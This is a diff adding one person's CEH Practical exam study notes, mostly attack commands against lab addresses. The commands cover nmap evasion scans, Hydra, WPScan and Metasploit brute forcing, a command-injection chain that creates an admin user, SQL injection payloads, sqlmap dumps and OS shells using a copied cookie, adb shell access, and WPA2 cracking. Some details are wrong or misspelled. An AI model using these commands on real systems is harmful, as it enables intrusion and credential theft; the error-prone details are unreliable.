@@ -1,0 +1,325 @@
+# My ceh practical notes
+#  Scanning Networks (always do sudo su) --> To be root
+
+netdiscover -r 1.1.1.0/24
+pluma - for file
+nmap -h
+pip3 install shell-gpt
+1- Nmap scan for alive/active hosts command for 192.189.19.18- nmap -A 192.189.19.0/24 or nmap -T4 -A ip
+
+sudo nmap -p 22 --open -sV 192.168.10.0/24   (The -sV flag reveals the OS/service version.)  
+sudo nmap -p 22 -A 192.168.10.0/24   (give all filtered . open and closed port details.  single command to do all scanning 
+sudo nmap -Pn -p 3389 -sV 192.168.10.220  _service info ignore if host up or not , which not respond to icmp ping or host is up but showing down behind firewall 
+nmap -sL 1.1.1.1 - check domain name 
+nmap -iL input.txt
+nano input.txt
+nmap -sS sitename - halfscan  very few traces 
+nmap -sn 1.1.1.1 if host up or not 
+nmap -sn -PR [Target IP Address]. The -sn disables port scan, and -PR performs ARP ping scan.
+nmap -sn -PE [Target IP Address]. The scan results show that the target host is operational, as seen in the screenshot below. The -PE carries out the ICMP ECHO ping scan.
+nmap -sn -PP [Target IP Address]. According to the scan findings, the target host is operational, as seen in the screenshot below. The -PP carries out the ICMP timestamp ping scan.
+nmap -sn -PM [target IP address]. This ICMP Address Mask Ping Scan approach is an alternative to the usual ICMP ECHO ping scan, identifying whether the target host is alive, especially when administrators disable ICMP ECHO pings.
+nmap -sn -PS [target IP address]. This TCP SYN Ping Scan technique sends empty TCP SYN packets to the target host, and the ACK response means the host is active.
+nmap -sn -PO [target IP address]. The IP Protocol Ping Scan method delivers probing packets from several IP protocols to the target host. A host is active if any probe returns a response
+ nmap -sS -v [Target IP Address] and Click the Scan button.
+Stealth scan/TCP half-open scan is done with -sS,
+nmap --script smb-os-discovery.nse [Target IP Address]. The scan results are shown under the Host script results section, along with the target OS, machine name, NetBIOS computer name, and other information. The --script outlines the custom script and smb-os-discovery.nse: tries to use the SMB protocol (ports 445 or 139) to find the OS, computer name, domain, workgroup, and current time.
+nmap -f [Target IP Address]. The -f switch splits the IP packet into tiny fragment packets.
+You may still retrieve the results showing all open TCP ports and the names of the services using them, even if Windows Defender Firewall is enabled on the target machine, as shown in the screenshot below.
+Execute the following command: nmap -g 80 [Target IP Address]. In this command, you can use the -g or --source-port option to manipulate the source port. 
+nmap -mtu 8 [Target IP Address]. The Maximum Transmission Unit (MTU) of this command is 8 bytes of packets, as indicated by the -mtu option.
+nmap -D RND:10 [Target IP Address]. In this command, -D performs a decoy scan, and RND generates random and non-reserved IP addresses (here, 10).
+nmap -sT -Pn --spoof-mac 0 [Target IP Address]. In this command, --spoof-mac 0 represents randomizing the MAC address, -sT performs the TCP connect/full open scan, -Pn is used to skip the host discovery.
+
+
+ 
+
+2- Zenmap/nmap command for TCP scan- First put the target ip in the Target: and then in the Command: put this command- nmap -sT -v 10.10.10.16
+3- Nmap scan if firewall/IDS is opened, half scan- nmap -sS -v 10.10.10.16 
+If even this the above command is not working then use this command-  namp -f 10.10.10.16
+4- -A command is aggressive scan it includes - OS detection (-O), Version (-sV), Script (-sS) and traceroute (--traceroute).
+5- Identify Target system os with (Time to Live) TTL and TCP window sizes using wireshark- Check the target ip Time to live value with protocol ICMP. If it is 128 then it is windows, as ICMP value came from windows. If TTL is 64 then it is linux. Every OS has different TTL. TTL 254 is solaris.
+6- Nmap scan for host discovery or OS- nmap -O 192.168.92.10 or you can use nmap -A 192.168.92.10
+7- If host is windows then use this command - nmap --script smb-os-discovery.nse 192.168.12.22 (this script determines the OS, computer name, domain, workgroup, time over smb protocol (ports 445 or 139).
+8- nmap command for source port manipulation, in this port is given or we use common port-  nmap -g 80 10.10.10.10
+
+WINDOWS - net user to check login user
+
+Connect ad
+sudo nmap -sn 10.0.0.0/8
+sudo nmap -sn 172.16.0.0/12
+sudo nmap -sn 192.168.0.0/16
+
+
+``` t	
+# Enumeration
+site geekforgeseek for commands 
+
+wpscan --url anysitewordpresss   show verison of php and ohe things 
+wpscan --url anysitewordpresss -e u    enumeration user
+wpscan --url 1.1.1.1 -usernames /home/attacker/user.txt --passworrds /home/attaaker/password.txt
+wpscan --url 1.1.1.1 -usernames /home/attacker/user.txt --passworrds /home/attaaker/password.txt 
+-U admin
+
+
+```
+1- NetBios enum using windows- in cmd type- nbtstat -a 10.10.10.10 (-a displays NEtBIOS name table)
+2- NetBios enum using nmap- nmap -sV -v --script nbstat.nse 10.10.10.16
+3- SNMP enum using nmap-  nmap -sU -p 161 10.10.10.10 (-p 161 is port for SNMP)--> Check if port is open
+                          snmp-check 10.10.10.10 ( It will show user accounts, processes etc) --> for parrot
+4- DNS recon/enum-  dnsrecon -d www.google.com -z
+5- FTP enum using nmap-  nmap -p 21 -A 10.10.10.10 
+6- NetBios enum using enum4linux- enum4linux -u martin -p apple -n 10.10.10.10 (all info)
+				  enum4linux -u martin -p apple -P 10.10.10.10 (policy info)
+```
+#  Quick Overview (Stegnography) --> Snow , Openstego
+```
+1- Hide Data Using Whitespace Stegnography- snow -C -m "My swiss account number is 121212121212" -p "magic" readme.txt readme2.txt  (magic is password and your secret is stored in readme2.txt along with the content of readme.txt)
+2- To Display Hidden Data- snow -C -p "magic" readme2.txt (then it will show the content of readme2.txt content)
+3- Image Stegnography using Openstego- PRACTICE ??
+```
+#  Sniffing
+```
+1- Password Sniffing using Wireshark- In pcap file apply filter: http.request.method==POST (you will get all the post request) Now to capture password click on edit in menu bar, then near Find packet section, on the "display filter" select "string", also select "Packet details" from the drop down of "Packet list", also change "narrow & wide" to "Narrow UTF-8 & ASCII", and then type "pwd" in the find section.
+```
+#  Hacking Web Servers
+
+
+
+```
+1- Footprinting web server Using Netcat and Telnet- nc -vv www.movies.com 80
+						    GET /HTTP/1.0
+						    telnet www.movies.com 80
+						    GET /HTTP/1.0
+2- Enumerate Web server info using nmap-  nmap -sV --script=http-enum www.movies.com
+3- Crack FTP credentials using nmap-  nmap -p 21 10.10.10.10 (check if it is open or not)
+				      ftp 10.10.10.10 (To see if it is directly connecting or needing credentials)
+Then go to Desktop and in Ceh tools folder you will find wordlists, here you will find usernames and passwords file.
+Now in terminal type-  hydra -L /home/attacker/Desktop/CEH_TOOLS/Wordlists/Username.txt -P /home/attacker/Desktop/CEH_TOOLS/Wordlists/Password.txt ftp://10.10.10.10
+
+hydra -l user -P passlist.txt ftp://10.10.10.10
+
+FTP 1.1.1.1
+get secret.txt
+
+HYDRA SITE - FREECODECAMP.ORG
+
+```
+#  Hacking Web Application
+```
+1- Scan Using OWASP ZAP (Parrot)- Type zaproxy in the terminal and then it would open. In target tab put the url and click automated scan.
+2- Directory Bruteforcing- gobuster dir -u 10.10.10.10 -w /home/attacker/Desktop/common.txt
+3- Enumerate a Web Application using WPscan & Metasploit BFA-  wpscan --url http://10.10.10.10:8080/NEW --enumerate u  (u means username)
+
+
+Then type msfconsole to open metasploit. Type -
+msfconsole
+use auxilliary/scanner/http/wordpress_login_enum   (use wordpress to search)
+ 						 show options
+						 set PASS_FILE /home/attacker/Desktop/Wordlist/password.txt
+						 set RHOSTS 10.10.10.10  (target ip)
+						 set RPORT 8080          (target port)
+						 set TARGETURI http://10.10.10.10:8080/
+						 set USERNAME admin
+						 exploit
+4- Brute Force using WPscan -    wpscan --url http://10.10.10.10:8080/NEW -u root -P passwdfile.txt (Use this only after enumerating the user like in step 3)
+			         wpscan --url http://10.10.10.10:8080/NEW --usernames userlist.txt, --passwords passwdlist.txt 
+5- Command Injection-  | net user  (Find users)
+ 		       | dir C:\  (directory listing)
+                       | net user Test/Add  (Add a user)
+		       | net user Test      (Check a user)
+		       | net localgroup Administrators Test/Add   (To convert the test account to admin)
+		       | net user Test      (Once again check to see if it has become administrator)
+Now you can do a RDP connection with the given ip and the Test account which you created.
+```
+#  SQL Injections
+
+
+```
+1- Auth Bypass-  anyname'OR 1=1 --   , POST METHOD - LOGIN OR DELETING  , VIEWPROFILE AND SEARCH SPMETHING GETMETHOD
+
+idor - insecure direct onject referenmce - attacker can deelte any parameter  - change id parameter 
+
+	OWASP - ZAPROXY.ORG - scan URL for vulenrability
+	
+	
+	
+	POST METHOD - POST METHOD - LOGIN OR DELETING  , VIEWPROFILE AND SEARCH SPMETHING GETMETHOD
+
+2- Insert new details if sql injection found in login page in username tab enter- blah';insert into login values('john','apple123');--
+3- Exploit a Blind SQL Injection- In the website profile, do inspect element and in the console tab write -  document.cookie
+Then copy the cookie value that was presented after this command. Then go to terminal and type this command,
+sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" --dbs
+4- Command to check tables of database retrieved-  sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" -D databasename --tables
+5- Select the table you want to dump-  sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" -D databasename -T Table_Name --dump   (Get username and password)
+6- For OS shell this is the command-   sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" --os-shell
+6.1 In the shell type-   TASKLIST  (to view the tasks)
+6.2 Use systeminfo for windows to get all os version
+6.3 Use uname -a for linux to get os version
+```
+# Android
+```
+1- nmap ip -sV -p 5555    (Scan for adb port)
+2- adb connect IP:5555    (Connect adb with parrot)
+3- adb shell              (Access mobile device on parrot)
+4- pwd --> ls --> cd sdcard --> ls --> cat secret.txt (If you can't find it there then go to Downloads folder using: cd downloads)
+find / -type f -name "*.txt" 2>/dev/null
+
+```
+# Wireshark
+```
+tcp.flags.syn == 1 and tcp.flags.ack == 0    (How many machines) or Go to statistics IPv4 addresses--> Source and Destination ---> Then you can apply the filter given
+tcp.flags.syn == 1   (Which machine for dos)
+http.request.method == POST   (for passwords) or click tools ---> credentials
+http.request.method == "POST"
+Also
+```
+# Find FQDN 
+```
+nmap -p389 –sV -iL <target_list>  or nmap -p389 –sV <target_IP> (Find the FQDN in a subnet/network)
+```
+# Cracking Wi-Fi networks
+```
+Cracking Wifi Password
+aircrack-ng [pcap file] (For cracking WEP network)
+aircrack-ng -a2 -b [Target BSSID] -w [password_Wordlist.txt] [WP2 PCAP file] (For cracking WPA2 or other networks through the captured .pcap file)
+
+```
+#  Some extra work 
+```
+Check RDP enabled after getting ip- nmap -p 3389 -iL ip.txt | grep open (ip.txt contains all the alive hosts from target subnet)
+Check MySQL service running- nmap -p 3306 -iL ip.txt | grep open        (ip.txt contains all the alive hosts from target subnet)
+```
+
+
+Current file at: https://github.com/dhabaleshwar/CEHPractical/blob/main/Everything%20You%20Need.md#hacking-web-application
+
+It says: Then type msfconsole to open metasploit. Type - use auxilliary/scanner/http/wordpress_login_enum
+
+Corrected line: Then type msfconsole to open metasploit. Type - use auxiliary/scanner/http/wordpress_login_enum
+
+Proof:
+[msf](Jobs:0 Agents:0) >> use auxilliary/scanner/http/wordpress_login_enum
+[-] No results from search
+[-] Failed to load module: auxilliary/scanner/http/wordpress_login_enum
+[msf](Jobs:0 Agents:0) >> use auxiliary/scanner/http/wordpress_login_enum
+[msf](Jobs:0 Agents:0) auxiliary(scanner/http/wordpress_login_enum) >>
+
+
+
+https://www.webasha.com/blog/ceh-practical-real-exam-questions-and-answers
+https://medium.com/@sohailahmed0x0/ceh-practical-exam-passed-1f722b48a53e
+https://www.webasha.com/blog/ceh-practical-real-exam-questions-and-answers
+https://github.com/3ls3if/Cybersecurity-Notes/blob/main/readme/ceh-engage-walkthrough/ceh-engage-part-3.md
+https://youtu.be/edEH2EJ7nx8?si=a5pRV0O-eXPlUwVX
+https://github.com/DarkLycn1976/CEH-Practical-Notes-and-Tools/blob/main/README.md
+https://www.stationx.net/how-to-use-burp-suite/
+https://campaigns.coderedpro.com/the-hands-on-blue-team-mastery?utm_source=codered&utm_medium=pop-up&utm_campaign=the-hands-on-blue-team-mastery#courses
+https://www.hackingloops.com/damn-vulnerable-web-application-tutorial/
+https://github.com/3ls3if/Cybersecurity-Notes/blob/main/readme/ceh-engage-walkthrough/ceh-engage-part-2.md
+
+
+wpscan --url http://10.10.10.10:8080/NEW -u root -P passwdfile.txt
+
+in case wpscan not work
+Then type msfconsole to open metasploit. Type -  use auxilliary/scanner/http/wordpress_login_enum
+ 						 show options
+						 set PASS_FILE /home/attacker/Desktop/Wordlist/password.txt
+						 set RHOSTS 10.10.10.10  (target ip)
+						 set RPORT 8080          (target port)
+						 set TARGETURI http://10.10.10.10:8080/NEW
+						 set USERNAME admin
+
+⭐ Step 1 — Enumerate usernames (choose the service)
+SSH
+ssh_enumusers
+
+Code
+use auxiliary/scanner/ssh/ssh_enumusers
+set RHOSTS <target>
+set USER_FILE <userlist>
+run
+
+SMB (Windows)
+smb_enumusers
+
+Code
+use auxiliary/scanner/smb/smb_enumusers
+set RHOSTS <target>
+run
+FTP
+ftp_login
+
+Code
+use auxiliary/scanner/ftp/ftp_login
+set USER_FILE <userlist>
+set PASS_FILE <passlist>
+run
+HTTP login (ANY website)
+http_login
+
+Code
+use auxiliary/scanner/http/http_login
+set RHOSTS <target>
+set TARGETURI /login
+set USER_FILE <userlist>
+set PASS_FILE <passlist>
+run
+WordPress
+wordpress_login_enum
+
+Code
+use auxiliary/scanner/http/wordpress_login_enum
+set RHOSTS <target>
+run
+⭐ Step 2 — Brute‑force passwords (after you find usernames)
+SSH
+ssh_login
+
+Code
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS <target>
+set USERNAME <valid-user>
+set PASS_FILE <password-list>
+run
+SMB
+smb_login
+
+Code
+use auxiliary/scanner/smb/smb_login
+set RHOSTS <target>
+set USERNAME <valid-user>
+set PASS_FILE <password-list>
+run
+FTP
+ftp_login
+
+Code
+use auxiliary/scanner/ftp/ftp_login
+set RHOSTS <target>
+set USERNAME <valid-user>
+set PASS_FILE <password-list>
+run
+HTTP login
+http_login
+
+Code
+use auxiliary/scanner/http/http_login
+set RHOSTS <target>
+set TARGETURI /login
+set USERNAME <valid-user>
+set PASS_FILE <password-list>
+run
+
+
+HASH CALCULATOR
+
+hashcalc
+creack hash =hashes.com
+cracstation
+
+bctextencoder  -
+
+cryptool
+
+OWASP ZAP - FOR WEBSITE CHECK 
